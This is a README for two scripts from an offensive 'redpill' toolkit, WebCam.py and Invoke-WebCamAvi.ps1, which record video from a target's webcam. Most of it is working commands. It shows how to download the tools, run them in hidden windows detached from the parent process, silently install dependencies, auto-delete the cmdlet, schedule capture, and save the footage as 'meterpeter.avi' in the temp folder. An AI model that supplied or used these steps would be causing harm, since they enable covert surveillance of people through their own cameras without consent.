## WebCam.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[WebCam](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/WebCam.py)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|

<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py" -OutFile "WebCam.py"
```

<br />

**prerequesites checks:**
```powershell
#Check if Pthon its installed
[bool](python -V)

#Check if opencv its installed
[bool](pip list|findstr /C:"opencv-python")

[OPTIONAL] #Install opencv and numpy modules
pip install opencv-python
```

<br />

**execute:**
```powershell
#Search for python 'site-packages' directory
gci "$Env:LOCALAPPDATA\Programs" -Recurse -Force|?{$_.PSIsContainer -Match "True" -and $_.Name -iMatch 'site-packages'}

#Edit WebCam.py and change next cmdline to point to your 'python\site-packages' directory
#Remark: remmenber to add double backslashs to your path ( eg. C:\\path\\path\\path\\path )
sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")

#Start capture
Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"

#Stop capture
Stop-Process -Name "python*" -Force
```

<br />

**Final Notes:**
```powershell
Video recording its stored on WebCam.py current directory under the name: "outpy.avi"
WebCam.py can be compiled to exe using pyinstaller: pyinstaller –onefile "WebCam.py"
```

<br /><br />


## Invoke-WebCamAvi.ps1

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-WebCamAvi](https://github.com/r00t-3xp10it/redpill/blob/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1)|Capture video (AVI) using default target webcam|User Land|Credits: @AHLASaad \ @AvinabSaha<br />[write-a-video-using-opencv-python](https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python)|


|Parameter name|Description|Default value|Remark|
|---|---|---|---|
|RecTime|Camera record time in seconds|15|accepts values from '10' up to '120' seconds (default)|
|FileName|Video.avi file name|meterpeter.avi|\*\*\*|
|WorkingDir|Cmdlet working directory|$Env:TMP|cmdlet will store files on sellected directory|
|RecLimmit|Record time limmit in seconds|120|Bypass cmdlet default MAX record time limmit|
|StartTime|Start record at selected time|off|Requires the first two digits to be 'HOURS'<br />and the last two digits to be 'MINUTS' eg. 09:07|
|ForceInstall|Silent install dependencies switch.|Switch|Silent install python 3 dependencies if missing|
|AutoDel|AutoDelete cmdlet in the end switch.|Switch|Auto-Delete Invoke-WebCamAvi cmdlet in the end|


<br />

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1" -OutFile "Invoke-webcamAvi.ps1"
```

<br />

**Prerequesites tests:**
```powershell
#Mandatory requirement
[bool](python -V)
```

<br />

**run cmdlet:**
```powershell
#Get module help
Get-Help .\Invoke-webcamAvi.ps1 -full

#Record webcam live stream for 20 seconds time
.\Invoke-webcamAvi.ps1 -RecTime '20'

#Record webcam live and use %TMP% as working directory
.\Invoke-webcamAvi.ps1 -WorkingDir "$Env:TMP"

#Record webcam live and rename avi file name
.\Invoke-webcamAvi.ps1 -FileName "capture.avi"

#Silent install of python3 dependencies if missing.
.\Invoke-WebCamAvi.ps1 -forceinstall

  -- Final Notes --
  
#Invoke -reclimmit 'int' to bypass max_rec_time restrictions
.\Invoke-WebCamAvi.ps1 -rectime '240' -reclimmit '240'

## Start webcam record at selected time frame ..
# Warning: -starttime input format requires 4 digits user inputs.
# The first two digits reffers to HOUR and the last two to MINUTS
.\Invoke-WebCamAvi.ps1 -starttime '09:07'

#Execute cmdlet in a hidden terminal window for 60 seconds ( child detach from parent process - orphan )
PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file Invoke-WebCamAvi.ps1 -rectime '60'"

#Execute cmdlet in a hidden windows, but only starts capture at '09:07' hours ( child detach from parent process - orphan )
PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file Invoke-WebCamAvi.ps1 -starttime '09:07' -rectime '60'"
```

<br />

**Final Notes:**
```powershell
Remark: Python 3 its mandatory requirement to run cmdlet ..
Invoke-webcamAvi cmdlet automates the execution of 'WebCam.py' and python packages dependencies.
Video recording (silent) its stored on cmdlet working directory under the name of: "meterpeter.avi"
```
